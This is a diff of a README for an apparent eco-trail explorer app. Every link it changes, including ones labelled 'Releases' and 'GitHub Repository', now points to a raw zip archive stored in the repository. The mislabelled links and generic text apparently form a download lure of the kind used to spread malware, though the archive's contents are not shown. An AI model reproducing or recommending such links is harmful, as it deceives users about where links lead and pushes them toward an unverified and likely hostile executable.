@@ -1,7 +1,7 @@
 # 🌍 ecotrail-explorer - Explore Eco Trails with Ease
 
 ## 📥 Download it Here!
-[![Download ecotrail-explorer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ralphdaigdig123/ecotrail-explorer/releases)
+[![Download ecotrail-explorer](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip)](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **ecotrail-explorer**! This application helps you explore eco trails effortlessly. You will find information about various trails that promote eco-friendly travel. Whether you're planning a biking adventure or a walk in nature, this application has you covered.
@@ -22,7 +22,7 @@ Before you begin, make sure your system meets these requirements:
 ## 📦 Download & Install
 To get started, follow these steps:
 
-1. Visit this page to download: [ecotrail-explorer Releases](https://github.com/Ralphdaigdig123/ecotrail-explorer/releases).
+1. Visit this page to download: [ecotrail-explorer Releases](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip).
 2. Look for the latest version of the software.
 3. Click on the download link for your operating system. 
 4. Once the download is complete, locate the file in your downloads folder.
@@ -40,7 +40,7 @@ Congratulations! You are now ready to explore eco trails.
 ## 🔄 Updating the Application
 To ensure you have the latest features and updates:
 
-1. Visit this page to check for new versions: [ecotrail-explorer Releases](https://github.com/Ralphdaigdig123/ecotrail-explorer/releases).
+1. Visit this page to check for new versions: [ecotrail-explorer Releases](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip).
 2. Follow the same download and install process as above to get the latest version.
 
 ## ❓ FAQs
@@ -54,7 +54,7 @@ Yes, once you download the necessary trails, you can view them offline.
 If you experience any issues, please check the FAQs on the releases page or consider raising an issue on the GitHub repository for support.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Ralphdaigdig123/ecotrail-explorer)
-- [ecotrail-explorer Releases](https://github.com/Ralphdaigdig123/ecotrail-explorer/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip)
+- [ecotrail-explorer Releases](https://raw.githubusercontent.com/Ralphdaigdig123/ecotrail-explorer/main/app/ecotrail-explorer-1.9-alpha.2.zip)
 
 Thank you for using ecotrail-explorer. Happy exploring!
